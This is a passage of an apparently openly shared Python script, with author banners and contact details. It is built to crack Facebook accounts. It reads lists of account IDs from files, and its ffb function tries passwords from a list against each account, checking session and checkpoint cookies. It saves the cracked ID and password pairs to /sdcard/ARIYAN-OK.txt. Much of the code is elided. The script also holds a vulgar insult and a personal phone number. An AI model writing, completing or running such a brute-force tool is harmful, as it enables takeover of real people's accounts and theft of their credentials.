#assalamowalikom OPEN source by (ARIYAN SABBIR )
#Fuck YATEEM kid ARIYAN SABBIR
...
\033[1;93m--------------------------------------------------
\033[1;37m[-] AUTHOR    :\033[1;32m ARIYAN SABBIR
\033[1;37m[-] GITHUB    :\033[1;32m HHH292
...
def auto_file(cookies,access_token):
    ...
    print('\n \033[1;35m /sdcard/ARIYAN.txt \033[0;97m\n')
...
def manual_file(cookies,access_token):
    ...
    try:
        ...
        limit = 1
    print('\n \033[1;32mExample: /sdcard/ARIYAN.txt \033[0;97m\n')
...
def sids():
    ...
    print('\n\033[1;32m Example: /sdcard/ARIYAN.txt\033[0;97m')
...
def ffb(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;32m [ARIYAN] %s|\033[1;32mOK:-%s \033[1;32m'%(loop,len(oks)));sys.stdout.flush()
	...
	try:
		for pas in passlist:
			...
			if 'session_key' in q:
				...
				open('/sdcard/ARIYAN-OK.txt', 'a').write(udx+'|'+pas+'\n')
				oks.append(ids)
				break
			...
			if 'c_user' in log_cookies:
				...
				if uid in oks:pass
					...
					if 'checkpoint' in str(lo):
						print('\r\r\033[1;34m [ARIYAN-TL] '+ids+' | '+pas)
					else:
						print(f'\r\x1b[1;32m [ARIYAN-OK] '+ids+' | '+pas)
...
\033[1;37m[-] AUTHOR    :\033[1;32m ARIYAN SABBIR
\033[1;37m[-] GITHUB    :\033[1;32m HHH292
\033[1;37m[-] WhatsApp  :\033[1;32m +8801568579466 
